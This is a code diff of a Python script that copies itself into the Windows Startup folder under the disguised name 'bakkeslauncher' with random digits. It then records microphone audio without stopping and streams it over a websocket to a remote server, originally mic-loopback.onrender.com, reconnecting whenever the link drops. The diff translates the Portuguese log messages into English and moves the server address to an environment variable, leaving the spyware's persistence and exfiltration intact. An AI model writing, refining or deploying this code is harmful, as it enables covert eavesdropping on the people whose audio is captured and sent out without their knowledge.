@@ -7,7 +7,10 @@ import os
 import shutil
 import sys
 import uuid
+from dotenv import load_dotenv
 import random
+
+load_dotenv();
 
 current_exe = sys.executable
 USERNAME = os.environ.get("USERNAME")
@@ -18,9 +21,9 @@ for f in os.listdir(startup_folder):
     if f.startswith("bakkeslauncher") and f.endswith(".exe"):
         try:
             os.remove(os.path.join(startup_folder, f))
-            print(f"Arquivo antigo {f} removido.")
+            print(f"Old file {f} removed.")
         except Exception as e:
-            print(f"Erro ao remover {f}: {e}")
+            print(f"Error removing {f}: {e}")
 
 random_number = random.randint(10, 99)
 dest_name = f"bakkeslauncher{random_number}.exe"
@@ -28,11 +31,12 @@ dest = os.path.join(startup_folder, dest_name)
 
 try:
     shutil.copy(current_exe, dest)
-    print(f"Copiado para Startup como {dest_name}.")
+    print(f"Copied to Startup as {dest_name}.")
 except Exception as e:
-    print("Erro ao copiar para Startup:", e)
+    print("Error copying to Startup:", e)
 
-SERVER_URL = "mic-loopback.onrender.com"
+print(f"SERVER_URL: {os.getenv("SERVER_URL")}")
+SERVER_URL = os.getenv("SERVER_URL")
 SAMPLE_RATE = 44100
 CHANNELS = 1
 CHUNK = 1024
@@ -45,13 +49,13 @@ def connect_ws(server_url):
     ws = websocket.WebSocket()
     for ws_url in urls:
         try:
-            print(f"Tentando conectar em {ws_url} ...")
+            print(f"Trying to connect to {ws_url} ...")
             ws.connect(ws_url)
-            print(f"Conectado com sucesso em {ws_url}")
+            print(f"Successfully connected to {ws_url}")
             return ws
         except Exception as e:
-            print(f"Falha ao conectar em {ws_url}: {e}")
-    raise ConnectionError("Não foi possível conectar em nenhum servidor WS/WSS.")
+            print(f"Failed to connect to {ws_url}: {e}")
+    raise ConnectionError("Could not connect to any WS/WSS server.")
 
 ws = connect_ws(SERVER_URL)
 
@@ -60,7 +64,7 @@ def send_frame(data_bytes: bytes):
         header = struct.pack("!I", len(TRANSMITTER_ID) + len(data_bytes))
         ws.send(header + TRANSMITTER_ID + data_bytes, opcode=websocket.ABNF.OPCODE_BINARY)
     except Exception as e:
-        print("Erro ao enviar frame:", e)
+        print("Error sending frame:", e)
 
 def callback(indata, frames, time_info, status):
     if status:
@@ -74,14 +78,14 @@ def start_audio_stream():
                             channels=CHANNELS,
                             dtype=DTYPE,
                             callback=callback):
-            print("Capturando áudio e enviando...")
+            print("Capturing and streaming audio...")
             send_frame(b"__transmitter_since")
             while True:
                 time.sleep(1)
     except KeyboardInterrupt:
-        print("Encerrando transmissão...")
+        print("Stopping transmission...")
     except Exception as e:
-        print("Erro na captura de áudio:", e)
+        print("Audio capture error:", e)
     finally:
         try:
             send_frame(b"__END__")
@@ -93,6 +97,6 @@ while True:
     try:
         start_audio_stream()
     except Exception as e:
-        print(f"Erro geral: {e}. Tentando reconectar em 3 segundos...")
+        print(f"General error: {e}. Trying to reconnect in 3 seconds...")
         time.sleep(3)
         ws = connect_ws(SERVER_URL)
